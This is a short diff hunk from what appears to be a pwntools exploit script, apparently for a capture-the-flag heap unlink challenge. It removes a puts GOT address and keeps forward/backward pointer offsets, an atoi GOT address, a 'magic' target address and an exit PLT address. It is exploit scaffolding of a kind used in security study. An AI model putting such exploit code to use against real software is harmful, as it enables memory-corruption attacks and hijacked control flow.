@@ -4,7 +4,6 @@ from pwn import *
 
 fd       = 0x6020c8 - (3*8)
 bk       = 0x6020c8 - (2*8)
-puts_got = 0x602020
 atoi_got = 0x602068
 magic    = 0x400d49
 exit_plt = 0x400786
